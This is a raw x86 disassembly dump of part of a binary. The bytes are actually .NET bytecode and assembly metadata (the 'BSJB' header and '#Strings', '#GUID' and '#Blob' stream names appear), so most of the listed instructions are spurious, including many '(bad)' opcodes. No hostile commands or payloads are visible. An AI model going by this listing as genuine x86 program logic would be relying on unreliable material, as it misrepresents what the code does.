  404236:	04 02                	add    $0x2,%al
  404238:	7c 4e                	jl     0x404288
  40423a:	00 00                	add    %al,(%eax)
  40423c:	04 12                	add    $0x12,%al
  40423e:	02 02                	add    (%edx),%al
  404240:	28 11                	sub    %dl,(%ecx)
  404242:	00 00                	add    %al,(%eax)
  404244:	2b dd                	sub    %ebp,%ebx
  404246:	e7 01                	out    %eax,$0x1
  404248:	00 00                	add    %al,(%eax)
  40424a:	02 7b 50             	add    0x50(%ebx),%bh
  40424d:	00 00                	add    %al,(%eax)
  40424f:	04 0c                	add    $0xc,%al
  404251:	02 7c 50 00          	add    0x0(%eax,%edx,2),%bh
  404255:	00 04 fe             	add    %al,(%esi,%edi,8)
  404258:	15 32 00 00 01       	adc    $0x1000032,%eax
  40425d:	02 15 25 0a 7d 4d    	add    0x4d7d0a25,%dl
  404263:	00 00                	add    %al,(%eax)
  404265:	04 12                	add    $0x12,%al
  404267:	02 28                	add    (%eax),%ch
  404269:	be 00 00 0a 7e       	mov    $0x7e0a0000,%esi
  40426e:	0c 00                	or     $0x0,%al
  404270:	00 04 20             	add    %al,(%eax,%eiz,1)
  404273:	30 75 00             	xor    %dh,0x0(%ebp)
  404276:	00 20                	add    %ah,(%eax)
  404278:	90                   	nop
  404279:	5f                   	pop    %edi
  40427a:	01 00                	add    %eax,(%eax)
  40427c:	6f                   	outsl  %ds:(%esi),(%dx)
  40427d:	6d                   	insl   (%dx),%es:(%edi)
  40427e:	00 00                	add    %al,(%eax)
  404280:	0a 0b                	or     (%ebx),%cl
  404282:	02 28                	add    (%eax),%ch
  404284:	ce                   	into
  404285:	00 00                	add    %al,(%eax)
  404287:	0a 0d 12 03 07 6c    	or     0x6c070312,%cl
  40428d:	28 cf                	sub    %cl,%bh
  40428f:	00 00                	add    %al,(%eax)
  404291:	0a 7d 4f             	or     0x4f(%ebp),%bh
  404294:	00 00                	add    %al,(%eax)
  404296:	04 72                	add    $0x72,%al
  404298:	d3 0d 00 70 07 20    	rorl   %cl,0x20077000
  40429e:	e8 03 00 00 5b       	call   0x5b4042a6
  4042a3:	8c 49 00             	mov    %cs,0x0(%ecx)
  4042a6:	00 01                	add    %al,(%ecx)
  4042a8:	28 d0                	sub    %dl,%al
  4042aa:	00 00                	add    %al,(%eax)
  4042ac:	0a 28                	or     (%eax),%ch
  4042ae:	24 00                	and    $0x0,%al
  4042b0:	00 06                	add    %al,(%esi)
  4042b2:	38 f3                	cmp    %dh,%bl
  4042b4:	00 00                	add    %al,(%eax)
  4042b6:	00 1b                	add    %bl,(%ebx)
  4042b8:	8d 1e                	lea    (%esi),%ebx
  4042ba:	00 00                	add    %al,(%eax)
  4042bc:	01 13                	add    %edx,(%ebx)
  4042be:	04 16                	add    $0x16,%al
  4042c0:	13 05 2b 10 11 04    	adc    0x411102b,%eax
  4042c6:	11 05 28 23 00 00    	adc    %eax,0x2328
  4042cc:	06                   	push   %es
  4042cd:	a2 11 05 17 58       	mov    %al,0x58170511
  4042d2:	13 05 11 05 11 04    	adc    0x4110511,%eax
  4042d8:	8e 69 32             	mov    0x32(%ecx),%gs
  4042db:	e8 11 04 28 d1       	call   0xd16846f1
  4042e0:	00 00                	add    %al,(%eax)
  4042e2:	0a 6f bb             	or     -0x45(%edi),%ch
  4042e5:	00 00                	add    %al,(%eax)
  4042e7:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4042ea:	02 28                	add    (%eax),%ch
  4042ec:	bc 00 00 0a 2d       	mov    $0x2d0a0000,%esp
  4042f1:	3f                   	aas
  4042f2:	02 17                	add    (%edi),%dl
  4042f4:	25 0a 7d 4d 00       	and    $0x4d7d0a,%eax
  4042f9:	00 04 02             	add    %al,(%edx,%eax,1)
  4042fc:	08 7d 50             	or     %bh,0x50(%ebp)
  4042ff:	00 00                	add    %al,(%eax)
  404301:	04 02                	add    $0x2,%al
  404303:	7c 4e                	jl     0x404353
  404305:	00 00                	add    %al,(%eax)
  404307:	04 12                	add    $0x12,%al
  404309:	02 02                	add    (%edx),%al
  40430b:	28 11                	sub    %dl,(%ecx)
  40430d:	00 00                	add    %al,(%eax)
  40430f:	2b dd                	sub    %ebp,%ebx
  404311:	1c 01                	sbb    $0x1,%al
  404313:	00 00                	add    %al,(%eax)
  404315:	02 7b 50             	add    0x50(%ebx),%bh
  404318:	00 00                	add    %al,(%eax)
  40431a:	04 0c                	add    $0xc,%al
  40431c:	02 7c 50 00          	add    0x0(%eax,%edx,2),%bh
  404320:	00 04 fe             	add    %al,(%esi,%edi,8)
  404323:	15 32 00 00 01       	adc    $0x1000032,%eax
  404328:	02 15 25 0a 7d 4d    	add    0x4d7d0a25,%dl
  40432e:	00 00                	add    %al,(%eax)
  404330:	04 12                	add    $0x12,%al
  404332:	02 28                	add    (%eax),%ch
  404334:	be 00 00 0a 7e       	mov    $0x7e0a0000,%esi
  404339:	0c 00                	or     $0x0,%al
  40433b:	00 04 1f             	add    %al,(%edi,%ebx,1)
  40433e:	1e                   	push   %ds
  40433f:	1f                   	pop    %ds
  404340:	46                   	inc    %esi
  404341:	6f                   	outsl  %ds:(%esi),(%dx)
  404342:	6d                   	insl   (%dx),%es:(%edi)
  404343:	00 00                	add    %al,(%eax)
  404345:	0a 7e 0e             	or     0xe(%esi),%bh
  404348:	00 00                	add    %al,(%eax)
  40434a:	04 6f                	add    $0x6f,%al
  40434c:	87 00                	xchg   %eax,(%eax)
  40434e:	00 0a                	add    %cl,(%edx)
  404350:	28 cd                	sub    %cl,%ch
  404352:	00 00                	add    %al,(%eax)
  404354:	0a 6f bb             	or     -0x45(%edi),%ch
  404357:	00 00                	add    %al,(%eax)
  404359:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40435c:	02 28                	add    (%eax),%ch
  40435e:	bc 00 00 0a 2d       	mov    $0x2d0a0000,%esp
  404363:	3f                   	aas
  404364:	02 18                	add    (%eax),%bl
  404366:	25 0a 7d 4d 00       	and    $0x4d7d0a,%eax
  40436b:	00 04 02             	add    %al,(%edx,%eax,1)
  40436e:	08 7d 50             	or     %bh,0x50(%ebp)
  404371:	00 00                	add    %al,(%eax)
  404373:	04 02                	add    $0x2,%al
  404375:	7c 4e                	jl     0x4043c5
  404377:	00 00                	add    %al,(%eax)
  404379:	04 12                	add    $0x12,%al
  40437b:	02 02                	add    (%edx),%al
  40437d:	28 11                	sub    %dl,(%ecx)
  40437f:	00 00                	add    %al,(%eax)
  404381:	2b dd                	sub    %ebp,%ebx
  404383:	aa                   	stos   %al,%es:(%edi)
  404384:	00 00                	add    %al,(%eax)
  404386:	00 02                	add    %al,(%edx)
  404388:	7b 50                	jnp    0x4043da
  40438a:	00 00                	add    %al,(%eax)
  40438c:	04 0c                	add    $0xc,%al
  40438e:	02 7c 50 00          	add    0x0(%eax,%edx,2),%bh
  404392:	00 04 fe             	add    %al,(%esi,%edi,8)
  404395:	15 32 00 00 01       	adc    $0x1000032,%eax
  40439a:	02 15 25 0a 7d 4d    	add    0x4d7d0a25,%dl
  4043a0:	00 00                	add    %al,(%eax)
  4043a2:	04 12                	add    $0x12,%al
  4043a4:	02 28                	add    (%eax),%ch
  4043a6:	be 00 00 0a 28       	mov    $0x280a0000,%esi
  4043ab:	ce                   	into
  4043ac:	00 00                	add    %al,(%eax)
  4043ae:	0a 02                	or     (%edx),%al
  4043b0:	7b 4f                	jnp    0x404401
  4043b2:	00 00                	add    %al,(%eax)
  4043b4:	04 28                	add    $0x28,%al
  4043b6:	d2 00                	rolb   %cl,(%eax)
  4043b8:	00 0a                	add    %cl,(%edx)
  4043ba:	2c 0f                	sub    $0xf,%al
  4043bc:	7e 0e                	jle    0x4043cc
  4043be:	00 00                	add    %al,(%eax)
  4043c0:	04 6f                	add    $0x6f,%al
  4043c2:	d3 00                	roll   %cl,(%eax)
  4043c4:	00 0a                	add    %cl,(%edx)
  4043c6:	39 ec                	cmp    %ebp,%esp
  4043c8:	fe                   	(bad)
  4043c9:	ff                   	(bad)
  4043ca:	ff 72 0f             	push   0xf(%edx)
  4043cd:	0e                   	push   %cs
  4043ce:	00 70 28             	add    %dh,0x28(%eax)
  4043d1:	24 00                	and    $0x0,%al
  4043d3:	00 06                	add    %al,(%esi)
  4043d5:	de 1d 26 de 29 13    	ficomps 0x1329de26
  4043db:	06                   	push   %es
  4043dc:	72 2f                	jb     0x40440d
  4043de:	0e                   	push   %cs
  4043df:	00 70 11             	add    %dh,0x11(%eax)
  4043e2:	06                   	push   %es
  4043e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043e4:	50                   	push   %eax
  4043e5:	00 00                	add    %al,(%eax)
  4043e7:	0a 28                	or     (%eax),%ch
  4043e9:	4d                   	dec    %ebp
  4043ea:	00 00                	add    %al,(%eax)
  4043ec:	0a 28                	or     (%eax),%ch
  4043ee:	24 00                	and    $0x0,%al
  4043f0:	00 06                	add    %al,(%esi)
  4043f2:	de 00                	fiadds (%eax)
  4043f4:	7e 0e                	jle    0x404404
  4043f6:	00 00                	add    %al,(%eax)
  4043f8:	04 6f                	add    $0x6f,%al
  4043fa:	d3 00                	roll   %cl,(%eax)
  4043fc:	00 0a                	add    %cl,(%edx)
  4043fe:	39 df                	cmp    %ebx,%edi
  404400:	fd                   	std
  404401:	ff                   	(bad)
  404402:	ff                   	lcall  (bad)
  404403:	de 19                	ficomps (%ecx)
  404405:	13 07                	adc    (%edi),%eax
  404407:	02 1f                	add    (%edi),%bl
  404409:	fe                   	(bad)
  40440a:	7d 4d                	jge    0x404459
  40440c:	00 00                	add    %al,(%eax)
  40440e:	04 02                	add    $0x2,%al
  404410:	7c 4e                	jl     0x404460
  404412:	00 00                	add    %al,(%eax)
  404414:	04 11                	add    $0x11,%al
  404416:	07                   	pop    %es
  404417:	28 c2                	sub    %al,%dl
  404419:	00 00                	add    %al,(%eax)
  40441b:	0a de                	or     %dh,%bl
  40441d:	13 02                	adc    (%edx),%eax
  40441f:	1f                   	pop    %ds
  404420:	fe                   	(bad)
  404421:	7d 4d                	jge    0x404470
  404423:	00 00                	add    %al,(%eax)
  404425:	04 02                	add    $0x2,%al
  404427:	7c 4e                	jl     0x404477
  404429:	00 00                	add    %al,(%eax)
  40442b:	04 28                	add    $0x28,%al
  40442d:	c3                   	ret
  40442e:	00 00                	add    %al,(%eax)
  404430:	0a 2a                	or     (%edx),%ch
  404432:	00 00                	add    %al,(%eax)
  404434:	41                   	inc    %ecx
  404435:	4c                   	dec    %esp
  404436:	00 00                	add    %al,(%eax)
  404438:	00 00                	add    %al,(%eax)
  40443a:	00 00                	add    %al,(%eax)
  40443c:	0f 00 00             	sldt   (%eax)
  40443f:	00 f4                	add    %dh,%ah
  404441:	01 00                	add    %eax,(%eax)
  404443:	00 03                	add    %al,(%ebx)
  404445:	02 00                	add    (%eax),%al
  404447:	00 03                	add    %al,(%ebx)
  404449:	00 00                	add    %al,(%eax)
  40444b:	00 3f                	add    %bh,(%edi)
  40444d:	00 00                	add    %al,(%eax)
  40444f:	01 00                	add    %eax,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 0f                	add    %cl,(%edi)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 f4                	add    %dh,%ah
  404459:	01 00                	add    %eax,(%eax)
  40445b:	00 06                	add    %al,(%esi)
  40445d:	02 00                	add    (%eax),%al
  40445f:	00 1a                	add    %bl,(%edx)
  404461:	00 00                	add    %al,(%eax)
  404463:	00 24 00             	add    %ah,(%eax,%eax,1)
  404466:	00 01                	add    %al,(%ecx)
  404468:	00 00                	add    %al,(%eax)
  40446a:	00 00                	add    %al,(%eax)
  40446c:	07                   	pop    %es
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 2a                	add    %ch,(%edx)
  404471:	02 00                	add    (%eax),%al
  404473:	00 31                	add    %dh,(%ecx)
  404475:	02 00                	add    (%eax),%al
  404477:	00 19                	add    %bl,(%ecx)
  404479:	00 00                	add    %al,(%eax)
  40447b:	00 24 00             	add    %ah,(%eax,%eax,1)
  40447e:	00 01                	add    %al,(%ecx)
  404480:	36 02 7c 4e 00       	add    %ss:0x0(%esi,%ecx,2),%bh
  404485:	00 04 03             	add    %al,(%ebx,%eax,1)
  404488:	28 c4                	sub    %al,%ah
  40448a:	00 00                	add    %al,(%eax)
  40448c:	0a 2a                	or     (%edx),%ch
  40448e:	00 00                	add    %al,(%eax)
  404490:	1b 30                	sbb    (%eax),%esi
  404492:	03 00                	add    (%eax),%eax
  404494:	49                   	dec    %ecx
  404495:	01 00                	add    %eax,(%eax)
  404497:	00 25 00 00 11 02    	add    %ah,0x2110000
  40449d:	7b 51                	jnp    0x4044f0
  40449f:	00 00                	add    %al,(%eax)
  4044a1:	04 0a                	add    $0xa,%al
  4044a3:	06                   	push   %es
  4044a4:	2c 0c                	sub    $0xc,%al
  4044a6:	06                   	push   %es
  4044a7:	17                   	pop    %ss
  4044a8:	3b cf                	cmp    %edi,%ecx
  4044aa:	00 00                	add    %al,(%eax)
  4044ac:	00 38                	add    %bh,(%eax)
  4044ae:	ed                   	in     (%dx),%eax
  4044af:	00 00                	add    %al,(%eax)
  4044b1:	00 00                	add    %al,(%eax)
  4044b3:	06                   	push   %es
  4044b4:	2c 37                	sub    $0x37,%al
  4044b6:	28 28                	sub    %ch,(%eax)
  4044b8:	00 00                	add    %al,(%eax)
  4044ba:	06                   	push   %es
  4044bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4044bc:	bb 00 00 0a 0b       	mov    $0xb0a0000,%ebx
  4044c1:	12 01                	adc    (%ecx),%al
  4044c3:	28 bc 00 00 0a 2d 3f 	sub    %bh,0x3f2d0a00(%eax,%eax,1)
  4044ca:	02 16                	add    (%esi),%dl
  4044cc:	25 0a 7d 51 00       	and    $0x517d0a,%eax
  4044d1:	00 04 02             	add    %al,(%edx,%eax,1)
  4044d4:	07                   	pop    %es
  4044d5:	7d 53                	jge    0x40452a
  4044d7:	00 00                	add    %al,(%eax)
  4044d9:	04 02                	add    $0x2,%al
  4044db:	7c 52                	jl     0x40452f
  4044dd:	00 00                	add    %al,(%eax)
  4044df:	04 12                	add    $0x12,%al
  4044e1:	01 02                	add    %eax,(%edx)
  4044e3:	28 12                	sub    %dl,(%edx)
  4044e5:	00 00                	add    %al,(%eax)
  4044e7:	2b dd                	sub    %ebp,%ebx
  4044e9:	f7 00 00 00 02 7b    	testl  $0x7b020000,(%eax)
  4044ef:	53                   	push   %ebx
  4044f0:	00 00                	add    %al,(%eax)
  4044f2:	04 0b                	add    $0xb,%al
  4044f4:	02 7c 53 00          	add    0x0(%ebx,%edx,2),%bh
  4044f8:	00 04 fe             	add    %al,(%esi,%edi,8)
  4044fb:	15 32 00 00 01       	adc    $0x1000032,%eax
  404500:	02 15 25 0a 7d 51    	add    0x517d0a25,%dl
  404506:	00 00                	add    %al,(%eax)
  404508:	04 12                	add    $0x12,%al
  40450a:	01 28                	add    %ebp,(%eax)
  40450c:	be 00 00 0a de       	mov    $0xde0a0000,%esi
  404511:	18 0c 72             	sbb    %cl,(%edx,%esi,2)
  404514:	51                   	push   %ecx
  404515:	0e                   	push   %cs
  404516:	00 70 08             	add    %dh,0x8(%eax)
  404519:	6f                   	outsl  %ds:(%esi),(%dx)
  40451a:	50                   	push   %eax
  40451b:	00 00                	add    %al,(%eax)
  40451d:	0a 28                	or     (%eax),%ch
  40451f:	4d                   	dec    %ebp
  404520:	00 00                	add    %al,(%eax)
  404522:	0a 28                	or     (%eax),%ch
  404524:	2a 00                	sub    (%eax),%al
  404526:	00 06                	add    %al,(%esi)
  404528:	de 00                	fiadds (%eax)
  40452a:	7e 10                	jle    0x40453c
  40452c:	00 00                	add    %al,(%eax)
  40452e:	04 20                	add    $0x20,%al
  404530:	c0 27 09             	shlb   $0x9,(%edi)
  404533:	00 20                	add    %ah,(%eax)
  404535:	80 ee 36             	sub    $0x36,%dh
  404538:	00 6f 6d             	add    %ch,0x6d(%edi)
  40453b:	00 00                	add    %al,(%eax)
  40453d:	0a 7e 12             	or     0x12(%esi),%bh
  404540:	00 00                	add    %al,(%eax)
  404542:	04 6f                	add    $0x6f,%al
  404544:	87 00                	xchg   %eax,(%eax)
  404546:	00 0a                	add    %cl,(%edx)
  404548:	28 cd                	sub    %cl,%ch
  40454a:	00 00                	add    %al,(%eax)
  40454c:	0a 6f bb             	or     -0x45(%edi),%ch
  40454f:	00 00                	add    %al,(%eax)
  404551:	0a 0b                	or     (%ebx),%cl
  404553:	12 01                	adc    (%ecx),%al
  404555:	28 bc 00 00 0a 2d 3c 	sub    %bh,0x3c2d0a00(%eax,%eax,1)
  40455c:	02 17                	add    (%edi),%dl
  40455e:	25 0a 7d 51 00       	and    $0x517d0a,%eax
  404563:	00 04 02             	add    %al,(%edx,%eax,1)
  404566:	07                   	pop    %es
  404567:	7d 53                	jge    0x4045bc
  404569:	00 00                	add    %al,(%eax)
  40456b:	04 02                	add    $0x2,%al
  40456d:	7c 52                	jl     0x4045c1
  40456f:	00 00                	add    %al,(%eax)
  404571:	04 12                	add    $0x12,%al
  404573:	01 02                	add    %eax,(%edx)
  404575:	28 12                	sub    %dl,(%edx)
  404577:	00 00                	add    %al,(%eax)
  404579:	2b de                	sub    %esi,%ebx
  40457b:	68 02 7b 53 00       	push   $0x537b02
  404580:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  404583:	02 7c 53 00          	add    0x0(%ebx,%edx,2),%bh
  404587:	00 04 fe             	add    %al,(%esi,%edi,8)
  40458a:	15 32 00 00 01       	adc    $0x1000032,%eax
  40458f:	02 15 25 0a 7d 51    	add    0x517d0a25,%dl
  404595:	00 00                	add    %al,(%eax)
  404597:	04 12                	add    $0x12,%al
  404599:	01 28                	add    %ebp,(%eax)
  40459b:	be 00 00 0a 7e       	mov    $0x7e0a0000,%esi
  4045a0:	12 00                	adc    (%eax),%al
  4045a2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4045a5:	87 00                	xchg   %eax,(%eax)
  4045a7:	00 0a                	add    %cl,(%edx)
  4045a9:	0d 12 03 28 d4       	or     $0xd4280312,%eax
  4045ae:	00 00                	add    %al,(%eax)
  4045b0:	0a 39                	or     (%ecx),%bh
  4045b2:	fc                   	cld
  4045b3:	fe                   	(bad)
  4045b4:	ff                   	(bad)
  4045b5:	ff                   	lcall  (bad)
  4045b6:	de 19                	ficomps (%ecx)
  4045b8:	13 04 02             	adc    (%edx,%eax,1),%eax
  4045bb:	1f                   	pop    %ds
  4045bc:	fe                   	(bad)
  4045bd:	7d 51                	jge    0x404610
  4045bf:	00 00                	add    %al,(%eax)
  4045c1:	04 02                	add    $0x2,%al
  4045c3:	7c 52                	jl     0x404617
  4045c5:	00 00                	add    %al,(%eax)
  4045c7:	04 11                	add    $0x11,%al
  4045c9:	04 28                	add    $0x28,%al
  4045cb:	c2 00 00             	ret    $0x0
  4045ce:	0a de                	or     %dh,%bl
  4045d0:	13 02                	adc    (%edx),%eax
  4045d2:	1f                   	pop    %ds
  4045d3:	fe                   	(bad)
  4045d4:	7d 51                	jge    0x404627
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	04 02                	add    $0x2,%al
  4045da:	7c 52                	jl     0x40462e
  4045dc:	00 00                	add    %al,(%eax)
  4045de:	04 28                	add    $0x28,%al
  4045e0:	c3                   	ret
  4045e1:	00 00                	add    %al,(%eax)
  4045e3:	0a 2a                	or     (%edx),%ch
  4045e5:	00 00                	add    %al,(%eax)
  4045e7:	00 41 34             	add    %al,0x34(%ecx)
  4045ea:	00 00                	add    %al,(%eax)
  4045ec:	00 00                	add    %al,(%eax)
  4045ee:	00 00                	add    %al,(%eax)
  4045f0:	17                   	pop    %ss
  4045f1:	00 00                	add    %al,(%eax)
  4045f3:	00 5f 00             	add    %bl,0x0(%edi)
  4045f6:	00 00                	add    %al,(%eax)
  4045f8:	76 00                	jbe    0x4045fa
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	18 00                	sbb    %al,(%eax)
  4045fe:	00 00                	add    %al,(%eax)
  404600:	24 00                	and    $0x0,%al
  404602:	00 01                	add    %al,(%ecx)
  404604:	00 00                	add    %al,(%eax)
  404606:	00 00                	add    %al,(%eax)
  404608:	07                   	pop    %es
  404609:	00 00                	add    %al,(%eax)
  40460b:	00 15 01 00 00 1c    	add    %dl,0x1c000001
  404611:	01 00                	add    %eax,(%eax)
  404613:	00 19                	add    %bl,(%ecx)
  404615:	00 00                	add    %al,(%eax)
  404617:	00 24 00             	add    %ah,(%eax,%eax,1)
  40461a:	00 01                	add    %al,(%ecx)
  40461c:	36 02 7c 52 00       	add    %ss:0x0(%edx,%edx,2),%bh
  404621:	00 04 03             	add    %al,(%ebx,%eax,1)
  404624:	28 c4                	sub    %al,%ah
  404626:	00 00                	add    %al,(%eax)
  404628:	0a 2a                	or     (%edx),%ch
  40462a:	00 00                	add    %al,(%eax)
  40462c:	42                   	inc    %edx
  40462d:	53                   	push   %ebx
  40462e:	4a                   	dec    %edx
  40462f:	42                   	inc    %edx
  404630:	01 00                	add    %eax,(%eax)
  404632:	01 00                	add    %eax,(%eax)
  404634:	00 00                	add    %al,(%eax)
  404636:	00 00                	add    %al,(%eax)
  404638:	0c 00                	or     $0x0,%al
  40463a:	00 00                	add    %al,(%eax)
  40463c:	76 34                	jbe    0x404672
  40463e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404641:	33 30                	xor    (%eax),%esi
  404643:	33 31                	xor    (%ecx),%esi
  404645:	39 00                	cmp    %eax,(%eax)
  404647:	00 00                	add    %al,(%eax)
  404649:	00 05 00 6c 00 00    	add    %al,0x6c00
  40464f:	00 a4 13 00 00 23 7e 	add    %ah,0x7e230000(%ebx,%edx,1)
  404656:	00 00                	add    %al,(%eax)
  404658:	10 14 00             	adc    %dl,(%eax,%eax,1)
  40465b:	00 94 14 00 00 23 53 	add    %dl,0x53230000(%esp,%edx,1)
  404662:	74 72                	je     0x4046d6
  404664:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  40466b:	00 a4 28 00 00 7c 0e 	add    %ah,0xe7c0000(%eax,%ebp,1)
  404672:	00 00                	add    %al,(%eax)
  404674:	23 55 53             	and    0x53(%ebp),%edx
  404677:	00 20                	add    %ah,(%eax)
  404679:	37                   	aaa
  40467a:	00 00                	add    %al,(%eax)
  40467c:	10 00                	adc    %al,(%eax)
  40467e:	00 00                	add    %al,(%eax)
  404680:	23 47 55             	and    0x55(%edi),%eax
  404683:	49                   	dec    %ecx
  404684:	44                   	inc    %esp
  404685:	00 00                	add    %al,(%eax)
  404687:	00 30                	add    %dh,(%eax)
  404689:	37                   	aaa
  40468a:	00 00                	add    %al,(%eax)
  40468c:	7c 09                	jl     0x404697
  40468e:	00 00                	add    %al,(%eax)
  404690:	23 42 6c             	and    0x6c(%edx),%eax
  404693:	6f                   	outsl  %ds:(%esi),(%dx)
  404694:	62 00                	bound  %eax,(%eax)
  404696:	00 00                	add    %al,(%eax)
  404698:	00 00                	add    %al,(%eax)
  40469a:	00 00                	add    %al,(%eax)
  40469c:	02 00                	add    (%eax),%al
  40469e:	00 01                	add    %al,(%ecx)
  4046a0:	57                   	push   %edi
  4046a1:	5f                   	pop    %edi
  4046a2:	02 0a                	add    (%edx),%cl
  4046a4:	09 0a                	or     %ecx,(%edx)
  4046a6:	00 00                	add    %al,(%eax)
  4046a8:	00 fa                	add    %bh,%dl
  4046aa:	01 33                	add    %esi,(%ebx)
  4046ac:	00 16                	add    %dl,(%esi)
  4046ae:	00 00                	add    %al,(%eax)
  4046b0:	01 00                	add    %eax,(%eax)
  4046b2:	00 00                	add    %al,(%eax)
  4046b4:	73 00                	jae    0x4046b6
  4046b6:	00 00                	add    %al,(%eax)
  4046b8:	1b 00                	sbb    (%eax),%eax
  4046ba:	00 00                	add    %al,(%eax)
  4046bc:	53                   	push   %ebx
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	00 52 00             	add    %dl,0x0(%edx)
  4046c2:	00 00                	add    %al,(%eax)
  4046c4:	1e                   	push   %ds
  4046c5:	00 00                	add    %al,(%eax)
  4046c7:	00 08                	add    %cl,(%eax)
  4046c9:	00 00                	add    %al,(%eax)
  4046cb:	00 d4                	add    %dl,%ah
  4046cd:	00 00                	add    %al,(%eax)
  4046cf:	00 02                	add    %al,(%edx)
  4046d1:	00 00                	add    %al,(%eax)
  4046d3:	00 2e                	add    %ch,(%esi)
  4046d5:	00 00                	add    %al,(%eax)
  4046d7:	00 01                	add    %al,(%ecx)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 25 00 00 00 10    	add    %ah,0x10000000
  4046e1:	00 00                	add    %al,(%eax)
  4046e3:	00 08                	add    %cl,(%eax)
  4046e5:	00 00                	add    %al,(%eax)
  4046e7:	00 01                	add    %al,(%ecx)
  4046e9:	00 00                	add    %al,(%eax)
  4046eb:	00 04 00             	add    %al,(%eax,%eax,1)
  4046ee:	00 00                	add    %al,(%eax)
  4046f0:	11 00                	adc    %eax,(%eax)
  4046f2:	00 00                	add    %al,(%eax)
  4046f4:	12 00                	adc    (%eax),%al
  4046f6:	00 00                	add    %al,(%eax)
  4046f8:	00 00                	add    %al,(%eax)
  4046fa:	b9 09 01 00 00       	mov    $0x109,%ecx
  4046ff:	00 00                	add    %al,(%eax)
  404701:	00 06                	add    %al,(%esi)
  404703:	00 e8                	add    %ch,%al
  404705:	08 e6                	or     %ah,%dh
  404707:	0f 06                	clts
  404709:	00 55 09             	add    %dl,0x9(%ebp)
  40470c:	e6 0f                	out    %al,$0xf
  40470e:	06                   	push   %es
  40470f:	00 cd                	add    %cl,%ch
  404711:	07                   	pop    %es
  404712:	5f                   	pop    %edi
  404713:	0f                   	(bad)
  404714:	0f 00 06             	sldt   (%esi)
  404717:	10 00                	adc    %al,(%eax)
  404719:	00 06                	add    %al,(%esi)
  40471b:	00 f5                	add    %dh,%ch
  40471d:	07                   	pop    %es
  40471e:	9d                   	popf
  40471f:	0c 06                	or     $0x6,%al
  404721:	00 cb                	add    %cl,%bl
  404723:	08 9d 0c 06 00 ac    	or     %bl,-0x53fff9f4(%ebp)
  404729:	08 9d 0c 06 00 3c    	or     %bl,0x3c00060c(%ebp)
  40472f:	09 9d 0c 06 00 08    	or     %ebx,0x800060c(%ebp)
  404735:	09 9d 0c 06 00 21    	or     %ebx,0x2100060c(%ebp)
  40473b:	09 9d 0c 06 00 27    	or     %ebx,0x2700060c(%ebp)
  404741:	08 9d 0c 06 00 e1    	or     %bl,-0x1efff9f4(%ebp)
  404747:	07                   	pop    %es
  404748:	c7                   	(bad)
  404749:	0f 06                	clts
  40474b:	00 a5 07 c7 0f 06    	add    %ah,0x60fc707(%ebp)
  404751:	00 73 08             	add    %dh,0x8(%ebx)
  404754:	9d                   	popf
  404755:	0c 06                	or     $0x6,%al
  404757:	00 42 08             	add    %al,0x8(%edx)
  40475a:	31 0a                	xor    %ecx,(%edx)
  40475c:	06                   	push   %es
  40475d:	00 8e 0c fb 10 06    	add    %cl,0x610fb0c(%esi)
  404763:	00 90 08 fb 10 06    	add    %dl,0x610fb08(%eax)
  404769:	00 b3 07 73 14 06    	add    %dh,0x6147307(%ebx)
  40476f:	00 3b                	add    %bh,(%ebx)
  404771:	12 ee                	adc    %dh,%ch
  404773:	0b 0a                	or     (%edx),%ecx
  404775:	00 0a                	add    %cl,(%edx)
  404777:	0e                   	push   %cs
  404778:	b1 12                	mov    $0x12,%cl
  40477a:	0a 00                	or     (%eax),%al
  40477c:	c6                   	(bad)
  40477d:	0c b1                	or     $0xb1,%al
  40477f:	12 57 00             	adc    0x0(%edi),%dl
  404782:	11 0f                	adc    %ecx,(%edi)
  404784:	00 00                	add    %al,(%eax)
  404786:	0e                   	push   %cs
  404787:	00 ca                	add    %cl,%dl
  404789:	11 5f 0f             	adc    %ebx,0xf(%edi)
  40478c:	06                   	push   %es
  40478d:	00 fe                	add    %bh,%dh
  40478f:	13 bc 01 06 00 8a 07 	adc    0x78a0006(%ecx,%eax,1),%edi
  404796:	e6 0f                	out    %al,$0xf
  404798:	06                   	push   %es
  404799:	00 ad 04 ee 0b 06    	add    %ch,0x60bee04(%ebp)
  40479f:	00 03                	add    %al,(%ebx)
  4047a1:	0c ee                	or     $0xee,%al
  4047a3:	0b 06                	or     (%esi),%eax
  4047a5:	00 1e                	add    %bl,(%esi)
  4047a7:	07                   	pop    %es
  4047a8:	ee                   	out    %al,(%dx)
  4047a9:	0b 06                	or     (%esi),%eax
  4047ab:	00 0c 08             	add    %cl,(%eax,%ecx,1)
  4047ae:	e6 0f                	out    %al,$0xf
  4047b0:	06                   	push   %es
  4047b1:	00 4b 0b             	add    %cl,0xb(%ebx)
  4047b4:	bd 10 0e 00 4a       	mov    $0x4a000e10,%ebp
  4047b9:	0e                   	push   %cs
  4047ba:	e0 11                	loopne 0x4047cd
  4047bc:	0e                   	push   %cs
  4047bd:	00 a7 12 e0 11 0e    	add    %ah,0xe11e012(%edi)
  4047c3:	00 bc 0b e0 11 06 00 	add    %bh,0x611e0(%ebx,%ecx,1)
  4047ca:	b7 0d                	mov    $0xd,%bh
  4047cc:	f8                   	clc
  4047cd:	02 06                	add    (%esi),%al
  4047cf:	00 79 0e             	add    %bh,0xe(%ecx)
  4047d2:	f8                   	clc
  4047d3:	02 06                	add    (%esi),%al
  4047d5:	00 22                	add    %ah,(%edx)
  4047d7:	0d ee 0b 0e 00       	or     $0xe0bee,%eax
  4047dc:	d2 11                	rclb   %cl,(%ecx)
  4047de:	4e                   	dec    %esi
  4047df:	12 0e                	adc    (%esi),%cl
  4047e1:	00 c8                	add    %cl,%al
  4047e3:	09 5e 0c             	or     %ebx,0xc(%esi)
  4047e6:	0e                   	push   %cs
  4047e7:	00 1c 14             	add    %bl,(%esp,%edx,1)
